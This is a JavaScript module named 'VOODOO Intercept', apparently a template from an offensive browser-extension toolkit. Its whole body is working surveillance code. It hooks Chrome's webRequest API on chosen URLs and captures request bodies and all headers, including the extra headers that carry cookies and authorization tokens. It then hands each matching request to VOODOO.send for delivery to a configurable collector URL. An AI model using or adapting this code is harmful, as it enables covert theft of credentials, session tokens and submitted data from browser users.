/**
 * VOODOO Intercept
 */
(function () {
    let options = {
        body_include: "%{body_include}",
        url_include: "%{url_include}",
        collector_url: "%{collector_url}",
        header_exists: "%{header_exists}"
    };

    let matches = "%{matches}";

    if (options.header_exists) {
        options.header_exists = options.header_exists.toLowerCase();
    }

    if (!Array.isArray(matches)) {
        matches = [matches];
    }

    function parseBody(body) {
        try {
            return body.raw.map(data => String.fromCharCode.apply(null, new Uint8Array(data.bytes))).join('')
        } catch {
            return "";
        }
    }

    const requests = new Map();

    chrome.webRequest.onBeforeSendHeaders.addListener(function (e) {
        const request = requests.get(e.requestId);

        if (!request) {
            return;
        }

        requests.delete(e.requestId);
        request.headers = e.requestHeaders;

        if (options.header_exists) {
            let found = false;
            for (let header of request.headers) {
                if (header.name.toLowerCase() === options.header_exists) {
                    found = true;
                    break;
                }
            }
            if (!found) {
                return;
            }
        }

        VOODOO.send(request);
    }, { urls: matches }, ['requestHeaders', 'extraHeaders'])

    chrome.webRequest.onBeforeRequest.addListener(
        function (request) {
            if (request.url.startsWith(options.collector_url)) {
                return { cancel: false };
            }

            if (options.url_include && request.url.indexOf(options.url_include) === -1) {
                return { cancel: false };
            }

            if (options.body_include && !request.requestBody) {
                return { cancel: false };
            }

            if (request.requestBody) {
                request.body = parseBody(request.requestBody);
                delete request.requestBody;
                if (options.body_include && request.body.indexOf(options.body_include) === -1) {
                    return { cancel: false };
                }
            }

            requests.set(request.requestId, request);
            return { cancel: false };
        },
        { urls: matches },
        ['requestBody']
    );
})();